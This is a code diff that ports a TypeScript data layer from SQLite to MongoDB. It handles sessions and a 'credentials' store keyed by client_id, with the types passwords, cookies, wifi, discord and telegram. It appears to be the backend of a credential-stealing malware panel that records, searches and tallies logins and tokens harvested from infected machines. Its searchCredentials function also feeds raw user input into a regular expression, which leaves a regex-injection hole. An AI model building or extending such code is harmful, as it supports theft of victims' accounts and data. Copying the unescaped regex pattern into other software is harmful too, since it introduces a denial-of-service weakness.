@@ -23,78 +23,88 @@ export interface Credential {
   created_at: string
 }
 
-export function createSession(username: string, ipAddress?: string, userAgent?: string): Session {
-  const db = getDatabase()
+export async function createSession(username: string, ipAddress?: string, userAgent?: string): Promise<Session> {
+  const db = await getDatabase()
   const id = uuidv4()
   const now = new Date().toISOString()
 
-  const stmt = db.prepare(`
-    INSERT INTO sessions (id, username, login_time, last_activity, ip_address, user_agent, is_active)
-    VALUES (?, ?, ?, ?, ?, ?, 1)
-  `)
+  const session: Session = {
+    id,
+    username,
+    login_time: now,
+    last_activity: now,
+    ip_address: ipAddress || undefined,
+    user_agent: userAgent || undefined,
+    is_active: true
+  }
 
-  stmt.run(id, username, now, now, ipAddress || null, userAgent || null)
-
-  return getSession(id)!
+  await db.collection('sessions').insertOne(session)
+  return session
 }
 
-export function getSession(id: string): Session | null {
-  const db = getDatabase()
-  const stmt = db.prepare('SELECT * FROM sessions WHERE id = ?')
-  const row = stmt.get(id) as any
+export async function getSession(id: string): Promise<Session | null> {
+  const db = await getDatabase()
+  const row = await db.collection('sessions').findOne({ id }) as any
   
   if (!row) return null
-  
   return formatSession(row)
 }
 
-export function getActiveSessions(): Session[] {
-  const db = getDatabase()
-  const stmt = db.prepare("SELECT * FROM sessions WHERE is_active = 1 ORDER BY last_activity DESC")
-  const rows = stmt.all() as any[]
+export async function getActiveSessions(): Promise<Session[]> {
+  const db = await getDatabase()
+  const rows = await db.collection('sessions')
+    .find({ is_active: true })
+    .sort({ last_activity: -1 })
+    .toArray() as any[]
   
   return rows.map(formatSession)
 }
 
-export function updateSessionActivity(id: string): void {
-  const db = getDatabase()
+export async function updateSessionActivity(id: string): Promise<void> {
+  const db = await getDatabase()
   const now = new Date().toISOString()
   
-  const stmt = db.prepare('UPDATE sessions SET last_activity = ? WHERE id = ?')
-  stmt.run(now, id)
+  await db.collection('sessions').updateOne(
+    { id },
+    { $set: { last_activity: now } }
+  )
 }
 
-export function endSession(id: string): boolean {
-  const db = getDatabase()
-  const stmt = db.prepare('UPDATE sessions SET is_active = 0 WHERE id = ?')
-  const result = stmt.run(id)
+export async function endSession(id: string): Promise<boolean> {
+  const db = await getDatabase()
+  const result = await db.collection('sessions').updateOne(
+    { id },
+    { $set: { is_active: false } }
+  )
   
-  return (result.changes ?? 0) > 0
+  return (result.modifiedCount ?? 0) > 0
 }
 
-export function endAllSessions(): number {
-  const db = getDatabase()
-  const stmt = db.prepare('UPDATE sessions SET is_active = 0 WHERE is_active = 1')
-  const result = stmt.run()
+export async function endAllSessions(): Promise<number> {
+  const db = await getDatabase()
+  const result = await db.collection('sessions').updateMany(
+    { is_active: true },
+    { $set: { is_active: false } }
+  )
   
-  return result.changes ?? 0
+  return result.modifiedCount ?? 0
 }
 
-export function getSessionStats(): {
+export async function getSessionStats(): Promise<{
   active: number
   total: number
-} {
-  const db = getDatabase()
+}> {
+  const db = await getDatabase()
   
-  const active = (db.prepare("SELECT COUNT(*) as count FROM sessions WHERE is_active = 1").get() as any).count
-  const total = (db.prepare("SELECT COUNT(*) as count FROM sessions").get() as any).count
+  const active = await db.collection('sessions').countDocuments({ is_active: true })
+  const total = await db.collection('sessions').countDocuments()
   
   return { active, total }
 }
 
 // Credentials functions
 
-export function recordCredential(input: {
+export async function recordCredential(input: {
   client_id: string
   credential_type: string
   username?: string
@@ -102,123 +112,107 @@ export function recordCredential(input: {
   domain?: string
   application?: string
   found_at?: string
-}): Credential {
-  const db = getDatabase()
+}): Promise<Credential> {
+  const db = await getDatabase()
   const id = uuidv4()
   const now = new Date().toISOString()
 
-  const stmt = db.prepare(`
-    INSERT INTO credentials 
-    (id, client_id, credential_type, username, password, domain, application, found_at, created_at)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-  `)
-
-  stmt.run(
+  const cred: Credential = {
     id,
-    input.client_id,
-    input.credential_type,
-    input.username || null,
-    input.password || null,
-    input.domain || null,
-    input.application || null,
-    input.found_at || null,
-    now
-  )
+    client_id: input.client_id,
+    credential_type: input.credential_type,
+    username: input.username || undefined,
+    password: input.password || undefined,
+    domain: input.domain || undefined,
+    application: input.application || undefined,
+    found_at: input.found_at || undefined,
+    created_at: now
+  }
 
-  return getCredential(id)!
+  await db.collection('credentials').insertOne(cred)
+  return cred
 }
 
-export function getCredential(id: string): Credential | null {
-  const db = getDatabase()
-  const stmt = db.prepare('SELECT * FROM credentials WHERE id = ?')
-  const row = stmt.get(id) as any
+export async function getCredential(id: string): Promise<Credential | null> {
+  const db = await getDatabase()
+  const row = await db.collection('credentials').findOne({ id }) as any
   
   if (!row) return null
-  
   return formatCredential(row)
 }
 
-export function getClientCredentials(clientId: string, limit = 100): Credential[] {
-  const db = getDatabase()
-  const stmt = db.prepare(`
-    SELECT * FROM credentials 
-    WHERE client_id = ? 
-    ORDER BY created_at DESC 
-    LIMIT ?
-  `)
+export async function getClientCredentials(clientId: string, limit = 100): Promise<Credential[]> {
+  const db = await getDatabase()
+  const rows = await db.collection('credentials')
+    .find({ client_id: clientId })
+    .sort({ created_at: -1 })
+    .limit(limit)
+    .toArray() as any[]
   
-  const rows = stmt.all(clientId, limit) as any[]
   return rows.map(formatCredential)
 }
 
-export function getCredentialsByType(clientId: string, type: string): Credential[] {
-  const db = getDatabase()
-  const stmt = db.prepare(`
-    SELECT * FROM credentials 
-    WHERE client_id = ? AND credential_type = ?
-    ORDER BY created_at DESC
-  `)
+export async function getCredentialsByType(clientId: string, type: string): Promise<Credential[]> {
+  const db = await getDatabase()
+  const rows = await db.collection('credentials')
+    .find({ client_id: clientId, credential_type: type })
+    .sort({ created_at: -1 })
+    .toArray() as any[]
   
-  const rows = stmt.all(clientId, type) as any[]
   return rows.map(formatCredential)
 }
 
-export function searchCredentials(clientId: string, query: string, limit = 50): Credential[] {
-  const db = getDatabase()
-  const searchTerm = `%${query}%`
+export async function searchCredentials(clientId: string, query: string, limit = 50): Promise<Credential[]> {
+  const db = await getDatabase()
+  const regex = new RegExp(query, 'i')
   
-  const stmt = db.prepare(`
-    SELECT * FROM credentials 
-    WHERE client_id = ? AND (
-      username LIKE ? 
-      OR domain LIKE ? 
-      OR application LIKE ?
-    )
-    ORDER BY created_at DESC 
-    LIMIT ?
-  `)
+  const rows = await db.collection('credentials').find({
+    client_id: clientId,
+    $or: [
+      { username: regex },
+      { domain: regex },
+      { application: regex }
+    ]
+  }).sort({ created_at: -1 }).limit(limit).toArray() as any[]
   
-  const rows = stmt.all(clientId, searchTerm, searchTerm, searchTerm, limit) as any[]
   return rows.map(formatCredential)
 }
 
-export function deleteCredential(id: string): boolean {
-  const db = getDatabase()
-  const stmt = db.prepare('DELETE FROM credentials WHERE id = ?')
-  const result = stmt.run(id)
-  
-  return (result.changes ?? 0) > 0
+export async function deleteCredential(id: string): Promise<boolean> {
+  const db = await getDatabase()
+  const result = await db.collection('credentials').deleteOne({ id })
+  return (result.deletedCount ?? 0) > 0
 }
 
-export function getCredentialStats(clientId: string): {
+export async function getCredentialStats(clientId: string): Promise<{
   total: number
   passwords: number
   cookies: number
   wifi: number
   discord: number
   telegram: number
-} {
-  const db = getDatabase()
+}> {
+  const db = await getDatabase()
   
-  const total = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ?").get(clientId) as any).count
-  const passwords = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'passwords'").get(clientId) as any).count
-  const cookies = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'cookies'").get(clientId) as any).count
-  const wifi = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'wifi'").get(clientId) as any).count
-  const discord = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'discord'").get(clientId) as any).count
-  const telegram = (db.prepare("SELECT COUNT(*) as count FROM credentials WHERE client_id = ? AND credential_type = 'telegram'").get(clientId) as any).count
+  const total = await db.collection('credentials').countDocuments({ client_id: clientId })
+  const passwords = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'passwords' })
+  const cookies = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'cookies' })
+  const wifi = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'wifi' })
+  const discord = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'discord' })
+  const telegram = await db.collection('credentials').countDocuments({ client_id: clientId, credential_type: 'telegram' })
   
   return { total, passwords, cookies, wifi, discord, telegram }
 }
 
-export function deleteOldCredentials(daysOld = 90): number {
-  const db = getDatabase()
-  const stmt = db.prepare(`
-    DELETE FROM credentials 
-    WHERE created_at < datetime('now', '-' || ? || ' days')
-  `)
-  
-  const result = stmt.run(daysOld)
-  return result.changes ?? 0
+export async function deleteOldCredentials(daysOld = 90): Promise<number> {
+  const db = await getDatabase()
+  const dateLimit = new Date();
+  dateLimit.setDate(dateLimit.getDate() - daysOld);
+
+  const result = await db.collection('credentials').deleteMany({
+    created_at: { $lt: dateLimit.toISOString() }
+  })
+  return result.deletedCount ?? 0
 }
 
 function formatSession(row: any): Session {
